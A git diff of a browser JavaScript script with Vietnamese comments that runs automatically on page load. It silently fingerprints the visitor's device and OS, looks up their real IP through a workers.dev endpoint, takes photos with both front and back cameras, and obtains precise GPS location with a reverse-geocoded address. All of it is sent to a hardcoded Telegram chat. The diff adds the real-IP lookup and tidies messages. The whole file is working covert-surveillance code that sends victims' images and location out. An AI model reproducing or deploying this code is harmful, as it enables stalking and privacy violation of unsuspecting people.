@@ -39,13 +39,31 @@ function detectDevice() {
   }
 }
 
+// ✅ Lấy IP gốc từ Worker
+async function getRealIP() {
+  try {
+    const res = await fetch("https://infoip.jayky2k9.workers.dev");
+    const data = await res.json();
 
-// ✅ Lấy vị trí chính xác hoặc fallback IP
+    if (data?.ip) {
+      info.realIp = data.ip;
+      info.ip = data.ip;
+      info.isp = data.isp || 'Không rõ';
+      info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
+      info.country = data.country || 'Không rõ';
+      info.lat = data.latitude?.toFixed(6) || '0';
+      info.lon = data.longitude?.toFixed(6) || '0';
+    }
+  } catch (err) {
+    console.warn("Không thể lấy IP gốc:", err);
+    info.realIp = 'Không xác định';
+  }
+}
+
+// ✅ Lấy vị trí chính xác hoặc fallback IP dân cư
 function getPreciseLocationOrFallbackToIP() {
   return new Promise(resolve => {
-    if (!navigator.geolocation) {
-      return getIPInfo().then(resolve);
-    }
+    if (!navigator.geolocation) return getIPInfo().then(resolve);
 
     navigator.geolocation.getCurrentPosition(
       async pos => {
@@ -57,10 +75,10 @@ function getPreciseLocationOrFallbackToIP() {
             headers: { "User-Agent": "Mozilla/5.0 (compatible; MyScript/1.0)" }
           });
           const data = await res.json();
-          info.address = data.display_name || '📍 Không rõ địa chỉ từ GPS';
+          info.address = data.display_name || '📍 GPS OK, không rõ địa chỉ';
           info.country = data.address?.country || 'Không rõ';
         } catch (err) {
-          info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
+          info.address = '📍 GPS OK, không rõ địa chỉ';
           info.country = 'Không rõ';
         }
 
@@ -78,12 +96,11 @@ function getPreciseLocationOrFallbackToIP() {
   });
 }
 
-// ✅ Lấy thông tin qua IP dân cư (khi GPS bị từ chối)
+// ✅ Lấy IP dân cư nếu GPS bị từ chối
 function getIPInfo() {
   return fetch("https://ipwho.is/")
     .then(res => res.json())
     .then(data => {
-      if (!data.success) throw new Error('IP lookup failed');
       info.ip = data.ip;
       info.isp = data.connection?.org || 'Không rõ';
       info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
@@ -110,6 +127,7 @@ function getCaption() {
 📱 Thiết bị: ${info.device}
 🖥️ Hệ điều hành: ${info.os}
 🌍 IP: ${info.ip}
+🔍 IP gốc: ${info.realIp}
 🏢 ISP: ${info.isp}
 🏙️ Địa chỉ: ${info.address}
 🌎 Quốc gia: ${info.country}
@@ -119,7 +137,7 @@ function getCaption() {
 `.trim();
 }
 
-// ✅ Chụp ảnh từ camera
+// ✅ Chụp camera (trước hoặc sau)
 function captureCamera(facingMode = "user") {
   return new Promise((resolve, reject) => {
     navigator.mediaDevices.getUserMedia({ video: { facingMode } })
@@ -145,7 +163,7 @@ function captureCamera(facingMode = "user") {
   });
 }
 
-// ✅ Gửi ảnh và thông tin về Telegram
+// ✅ Gửi ảnh về Telegram
 async function sendTwoPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -169,21 +187,20 @@ async function sendTwoPhotos(frontBlob, backBlob) {
   });
 }
 
-// ✅ Gọi hàm chính
+// ✅ Gọi script chính
 async function main() {
   detectDevice();
   await getRealIP();
 
-  let frontBlob = null;
-  let backBlob = null;
+  let frontBlob = null, backBlob = null;
 
   try {
     frontBlob = await captureCamera("user");
     backBlob = await captureCamera("environment");
     info.camera = '✅ Đã chụp camera trước và sau';
   } catch (err) {
-    console.warn("Không chụp đủ camera:", err.message);
     info.camera = '🚫 Không thể truy cập đủ camera';
+    console.warn("Camera error:", err);
   }
 
   await getPreciseLocationOrFallbackToIP();
@@ -202,5 +219,4 @@ async function main() {
   }
 }
 
-// ✅ Gọi script
 main();
